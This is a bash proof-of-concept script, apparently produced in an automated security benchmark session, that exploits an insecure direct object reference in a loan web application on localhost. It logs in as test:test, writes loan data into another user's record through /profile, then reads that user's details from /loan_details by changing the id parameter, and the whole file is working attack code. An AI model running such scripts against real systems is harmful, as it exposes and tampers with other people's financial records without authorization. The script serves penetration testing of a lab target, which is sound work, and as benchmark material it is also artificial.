#!/bin/bash
# POC: IDOR vulnerability in /loan_details endpoint allowing unauthorized access to other users' loan information
# Target: ./repo
# Created: 2025-11-07T19:19:57.429Z
# Session: benchmark-XBEN-063-24-mhp81tzn

# IDOR Vulnerability POC: Loan Details Endpoint
# This script demonstrates how an authenticated user (test:test) can access
# other users' loan details by manipulating the 'id' parameter

set -e

TARGET="http://localhost"
ATTACKER_USER="test"
ATTACKER_PASS="test"
VICTIM_USER_ID="5"

echo "[*] IDOR in Loan Details - POC"
echo "[*] Target: $TARGET"
echo ""

# Step 1: Login as attacker user (test:test)
echo "[+] Step 1: Logging in as attacker user ($ATTACKER_USER:$ATTACKER_PASS)..."
LOGIN_RESPONSE=$(curl -s -X POST "$TARGET/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$ATTACKER_USER&password=$ATTACKER_PASS" \
  -i)

# Extract session cookie from response
SESSION_COOKIE=$(echo "$LOGIN_RESPONSE" | grep -i "set-cookie:" | grep -o "session=[^;]*" | head -1)

if [ -z "$SESSION_COOKIE" ]; then
  echo "[-] Failed to obtain session cookie"
  exit 1
fi

echo "[+] Session obtained: $SESSION_COOKIE"
echo ""

# Step 2: Setup victim user's loan details first
echo "[+] Step 2: Setting up victim user's loan details (user_id=$VICTIM_USER_ID)..."
SETUP_RESPONSE=$(curl -s -X POST "$TARGET/profile" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: $SESSION_COOKIE" \
  -d "id=$VICTIM_USER_ID&name=Victim%20User&principal=5000.0&term=48&monthly_payment=120.0")

echo "[+] Victim data set up"
echo ""

# Step 3: Attempt to access victim's loan details using IDOR
echo "[+] Step 3: Accessing victim's loan details via IDOR (id=$VICTIM_USER_ID)..."
LOAN_DETAILS=$(curl -s -X GET "$TARGET/loan_details?id=$VICTIM_USER_ID" \
  -H "Cookie: $SESSION_COOKIE")

echo "[+] Response received:"
echo "$LOAN_DETAILS"
echo ""

# Step 4: Verify that we can see the victim's loan information
if echo "$LOAN_DETAILS" | grep -q "5000.0"; then
  echo "[✓] IDOR VULNERABILITY CONFIRMED!"
  echo "[✓] Successfully accessed user $VICTIM_USER_ID's loan details"
  echo "[✓] Victim's loan principal: 5000.0"
  if echo "$LOAN_DETAILS" | grep -q "120.0"; then
    echo "[✓] Victim's monthly payment: 120.0"
  fi
  if echo "$LOAN_DETAILS" | grep -q "48"; then
    echo "[✓] Victim's loan term: 48 months"
  fi
  echo ""
  echo "[!] Impact: Authenticated attacker can enumerate all users' loan details!"
  exit 0
else
  echo "[-] Could not confirm IDOR vulnerability - expected loan data not found in response"
  echo "[-] Full response: $LOAN_DETAILS"
  exit 1
fi